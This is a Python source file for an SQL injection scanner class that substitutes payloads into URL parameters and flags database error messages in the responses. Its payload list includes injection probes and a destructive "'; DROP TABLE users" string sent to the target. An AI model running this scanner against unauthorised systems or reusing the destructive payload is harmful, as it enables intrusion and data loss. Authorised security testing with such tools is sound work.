import sys
from urllib.parse import urlparse, parse_qs
from utils.printer import Printer
from utils.requests_helper import RequestHelper

class SQLiEngine:
    def __init__(self, url, method='GET', param=None, delay=0):
        self.url = url
        self.method = method.upper()
        self.param = param
        self.request = RequestHelper(delay=delay)
        self.vulnerable_params = []
        self.dbms = None
        Printer.print_info(f"Initializing scan on {url}")
    
    def test_error_based(self):
        """Test error-based SQL injection"""
        Printer.print_info("Testing error-based SQL injection...")
        
        error_payloads = [
            "'",
            "\"",
            "1' AND 1=1-- -",
            "1' AND 1=2-- -",
            "' OR '1'='1",
            "1' ORDER BY 1-- -",
            "1' UNION SELECT NULL-- -",
            "'; DROP TABLE users-- -"
        ]
        
        error_patterns = [
            "mysql_fetch",
            "mysql_num_rows",
            "mysql_error",
            "MySQLSyntaxErrorException",
            "ODBC SQL Server Driver",
            "Microsoft OLE DB",
            "Incorrect syntax near",
            "Unclosed quotation mark",
            "You have an error in your SQL syntax",
            "Division by zero",
            "Unknown column"
        ]
        
        parsed = urlparse(self.url)
        params = parse_qs(parsed.query)
        
        if not params:
            Printer.print_warning("No parameters found in URL")
            return False
        
        for param_name in params:
            original_value = params[param_name][0]
            Printer.print_info(f"Testing parameter: {param_name}")
            
            for payload in error_payloads:
                test_params = params.copy()
                test_params[param_name] = [payload]
                
                from urllib.parse import urlencode
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params, doseq=True)}"
                
                response = self.request.send_get(test_url)
                
                if response:
                    response_text = response.text.lower()
                    for pattern in error_patterns:
                        if pattern.lower() in response_text:
                            Printer.print_success(f"Possible SQL injection found in parameter: {param_name}")
                            Printer.print_success(f"Payload: {payload}")
                            Printer.print_success(f"Error pattern: {pattern}")
                            self.vulnerable_params.append({
                                'param': param_name,
                                'payload': payload,
                                'pattern': pattern
                            })
                            return True
        
        return False
    
    def run_scan(self):
        """Run all SQL injection tests"""
        Printer.print_info("Starting SQL injection scan...")
        
        if self.test_error_based():
            Printer.print_success("Vulnerability found!")
            return True
        else:
            Printer.print_warning("No vulnerabilities found with error-based tests")
            return False